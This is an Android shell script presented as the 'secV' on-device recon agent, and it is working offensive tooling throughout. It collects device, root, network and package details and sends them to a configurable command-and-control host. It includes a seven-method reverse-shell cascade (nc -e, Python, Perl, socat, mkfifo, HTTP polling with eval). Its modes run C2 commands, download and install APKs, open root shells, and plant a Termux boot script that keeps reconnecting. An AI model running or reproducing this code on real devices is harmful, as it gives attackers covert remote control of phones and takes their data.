#!/system/bin/sh
# secV on-device recon agent v1.0
# Lightweight shell agent — works without compilation on any Android.
# Push: adb push secv_agent.sh /data/local/tmp/secv_a.sh
# Run:  adb shell sh /data/local/tmp/secv_a.sh [C2_HOST] [C2_PORT]
# Or:   adb shell 'C2_HOST=1.2.3.4 C2_PORT=8889 sh /data/local/tmp/secv_a.sh'

C2_HOST="${1:-${C2_HOST:-127.0.0.1}}"
C2_PORT="${2:-${C2_PORT:-8889}}"
MODE="${3:-${MODE:-recon}}"   # recon | exploit | persist | c2

# ── helper ──────────────────────────────────────────────────────────
prop()  { getprop "$1" 2>/dev/null; }
has()   { command -v "$1" >/dev/null 2>&1; }
root()  { su -c "$@" 2>/dev/null; }

# Reverse shell — 7-method cascade, Android compatible.
# Tries every available technique in order of reliability.
_rev_shell() {
  _host="$1"; _port="$2"
  TERMUX_NC=/data/data/com.termux/files/usr/bin/nc
  TERMUX_PY=/data/data/com.termux/files/usr/bin/python3
  TERMUX_PERL=/data/data/com.termux/files/usr/bin/perl

  # M1: Termux nc -e (BusyBox nc supports -e in connect mode)
  if [ -x "$TERMUX_NC" ]; then
    "$TERMUX_NC" -e /system/bin/sh "$_host" "$_port" 2>/dev/null &
    return
  fi

  # M2: Termux Python3 socket shell
  if [ -x "$TERMUX_PY" ]; then
    "$TERMUX_PY" -c "
import socket,subprocess,os
s=socket.socket()
s.connect(('$_host',$_port))
[os.dup2(s.fileno(),i) for i in range(3)]
subprocess.call(['/system/bin/sh','-i'])
" 2>/dev/null &
    return
  fi

  # M3: socat (occasionally present on custom ROMs)
  if has socat; then
    socat tcp:"$_host":"$_port" exec:"/system/bin/sh -i",pty,stderr 2>/dev/null &
    return
  fi

  # M4: busybox nc -e (some ROMs ship busybox)
  if has busybox && busybox nc --help 2>&1 | grep -q '\-e'; then
    busybox nc -e /system/bin/sh "$_host" "$_port" 2>/dev/null &
    return
  fi

  # M5: mkfifo (works when SELinux is permissive or on older Android)
  #     Attempt it — SELinux may allow it on this device even without root
  _f=$(mktemp -u /data/local/tmp/._svXXXXXX 2>/dev/null || echo /data/local/tmp/._sv$$)
  if mkfifo "$_f" 2>/dev/null; then
    /system/bin/sh -i <"$_f" | nc "$_host" "$_port" >"$_f" 2>/dev/null &
    rm -f "$_f" 2>/dev/null
    return
  fi

  # M6: Termux Perl (comes pre-installed on many Termux setups)
  if [ -x "$TERMUX_PERL" ]; then
    "$TERMUX_PERL" -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in('"$_port"',inet_aton("'"$_host"'")));
open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
exec("/system/bin/sh -i");
' 2>/dev/null &
    return
  fi

  # M7: HTTP polling C2 — no persistent connection needed, works anywhere curl exists.
  #     C2 must serve commands at http://<host>:<port>/cmd and accept POST at /result.
  #     Falls back to the HTTP C2 port if set, else uses lport as HTTP port.
  if has curl; then
    ( while true; do
        _CMD=$(curl -sf --connect-timeout 5 "http://$_host:$_port/cmd" 2>/dev/null)
        [ -z "$_CMD" ] && { sleep 15; continue; }
        _OUT=$(eval "$_CMD" 2>&1)
        curl -sf -X POST "http://$_host:$_port/result" \
             -H 'Content-Type: text/plain' \
             --data-binary "$_OUT" 2>/dev/null
        sleep 5
      done ) &
    return
  fi

  # All methods exhausted — report failure via C2 if HTTP available
  :
}

# ── device fingerprint ───────────────────────────────────────────────
MODEL=$(prop ro.product.model)
MFR=$(prop ro.product.manufacturer)
ANDROID=$(prop ro.build.version.release)
SDK=$(prop ro.build.version.sdk)
PATCH=$(prop ro.build.version.security_patch)
CHIPSET=$(prop ro.board.platform)
ARCH=$(prop ro.product.cpu.abi)
KERNEL=$(uname -r 2>/dev/null)
BUILD=$(prop ro.build.fingerprint)
BOOTLOCKED=$(prop ro.boot.flash.locked)
SELINUX=$(getenforce 2>/dev/null || echo unknown)
BATTLV=$(dumpsys battery 2>/dev/null | grep 'level:' | awk '{print $2}')

# ── root detection ────────────────────────────────────────────────────
ROOT_STATUS=none
ROOT_BIN=
for su_path in /system_ext/bin/su /debug_ramdisk/su /system/bin/su /system/xbin/su \
               /data/adb/magisk/su /sbin/su /su/bin/su; do
  if [ -f "$su_path" ]; then
    res=$("$su_path" -c id 2>/dev/null)
    if echo "$res" | grep -q "uid=0"; then
      ROOT_STATUS="rooted"
      ROOT_BIN="$su_path"
      break
    fi
  fi
done
if pgrep -x magiskd >/dev/null 2>&1; then
  ROOT_STATUS="${ROOT_STATUS}|magiskd_running"
fi
if [ -e /dev/ksud ] || [ -f /data/adb/ksud ]; then
  ROOT_STATUS="${ROOT_STATUS}|kernelsu"
fi

# ── network ──────────────────────────────────────────────────────────
IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
[ -z "$IP" ] && IP=$(ip route get 1.1.1.1 2>/dev/null | grep src | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}')
GW=$(ip route 2>/dev/null | grep default | awk '{print $3}' | head -1)
ADB_TCP=$(prop service.adb.tcp.port)
OPEN_PORTS=$(ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,":");if(a[2]>0)printf a[2]","}' | sed 's/,$//')

# ── installed packages ────────────────────────────────────────────────
PKGS=$(pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\n' ',' | sed 's/,$//')
PKGS_COUNT=$(pm list packages 2>/dev/null | wc -l)

# ── Termux detection (attack surface) ────────────────────────────────
TERMUX=false
pm list packages com.termux >/dev/null 2>&1 && TERMUX=true

# ── build JSON ────────────────────────────────────────────────────────
REPORT=$(printf '{
  "agent":"secV/1.0",
  "mode":"%s",
  "device":{
    "model":"%s","manufacturer":"%s","android":"%s","sdk":%s,
    "security_patch":"%s","chipset":"%s","arch":"%s","kernel":"%s",
    "root":"%s","root_bin":"%s","selinux":"%s",
    "bootlocked":"%s","battery":"%s",
    "build":"%s"
  },
  "network":{
    "ip":"%s","gateway":"%s","adb_tcp_port":"%s","open_ports":"%s"
  },
  "packages":{"count":%s,"third_party":"%s"},
  "attack_surface":{"termux":%s,"adb_wifi":"%s"}
}' \
  "$MODE" "$MODEL" "$MFR" "$ANDROID" "${SDK:-0}" \
  "$PATCH" "$CHIPSET" "$ARCH" "$KERNEL" \
  "$ROOT_STATUS" "$ROOT_BIN" "$SELINUX" \
  "$BOOTLOCKED" "$BATTLV" "$BUILD" \
  "$IP" "$GW" "$ADB_TCP" "$OPEN_PORTS" \
  "${PKGS_COUNT:-0}" "$PKGS" \
  "$TERMUX" "$ADB_TCP")

# ── exploit stage ────────────────────────────────────────────────────
if [ "$MODE" = "exploit" ] || [ "$MODE" = "c2" ]; then
  # Receive instructions from C2 and execute
  # (C2 responds with a command to run: "SH:<command>" or "APK:<url>")
  RESP=$(echo "$REPORT" | \
    (nc -q2 "$C2_HOST" "$C2_PORT" 2>/dev/null || \
     curl -sf -X POST "http://$C2_HOST:$C2_PORT/agent" \
          -H 'Content-Type: application/json' -d @- 2>/dev/null))
  INSTR=$(echo "$RESP" | grep -o '"cmd":"[^"]*"' | cut -d'"' -f4)
  case "$INSTR" in
    SH:*)   eval "${INSTR#SH:}" ;;
    APK:*)  url="${INSTR#APK:}"
            curl -sf -o /data/local/tmp/._secv_payload.apk "$url" 2>/dev/null
            pm install -r -t /data/local/tmp/._secv_payload.apk 2>/dev/null ;;
    SHELL:*) connect="${INSTR#SHELL:}"
             host="${connect%:*}"; port="${connect#*:}"
             _rev_shell "$host" "$port" ;;
    ROOT_SHELL:*)
             connect="${INSTR#ROOT_SHELL:}"
             host="${connect%:*}"; port="${connect#*:}"
             if [ -n "$ROOT_BIN" ]; then
               # mkfifo inside su — shell context can't create fifos (SELinux)
               "$ROOT_BIN" -c "f=\$(mktemp /data/local/tmp/._svXXXXXX); rm \$f; mkfifo \$f; /system/bin/sh -i <\$f | nc $host $port >\$f 2>/dev/null; rm -f \$f" &
             else
               _rev_shell "$host" "$port"
             fi ;;
  esac
  exit 0
fi

# ── persist stage ────────────────────────────────────────────────────
if [ "$MODE" = "persist" ]; then
  # Termux:Boot persistence
  BOOT_DIR=/data/data/com.termux/files/home/.termux/boot
  if [ "$TERMUX" = "true" ] && pm list packages com.termux.boot >/dev/null 2>&1; then
    mkdir -p "$BOOT_DIR" 2>/dev/null
    cat > "$BOOT_DIR/secv.sh" <<BOOTEOF
#!/data/data/com.termux/files/usr/bin/bash
_reconnect() {
  local f=\$(mktemp -u /data/local/tmp/._svXXXXXX)
  mkfifo "\$f" 2>/dev/null
  bash -i <"\$f" | nc $C2_HOST $C2_PORT >"\$f" 2>/dev/null
  rm -f "\$f" 2>/dev/null
}
while true; do _reconnect; sleep 45; done &
BOOTEOF
    chmod 700 "$BOOT_DIR/secv.sh" 2>/dev/null
    echo '{"persist":"termux_boot","success":true}' | nc -q1 "$C2_HOST" "$C2_PORT" 2>/dev/null
    exit 0
  fi
  # Fallback: print REPORT (caller handles persistence)
fi

# ── send report ───────────────────────────────────────────────────────
sent=false
if has nc; then
  echo "$REPORT" | nc -q2 "$C2_HOST" "$C2_PORT" 2>/dev/null && sent=true
fi
if [ "$sent" = "false" ] && has curl; then
  curl -sf -X POST "http://$C2_HOST:$C2_PORT/agent" \
       -H 'Content-Type: application/json' \
       --data "$REPORT" 2>/dev/null && sent=true
fi
# Always print to stdout (captured by ADB shell if running via adb shell)
echo "$REPORT"
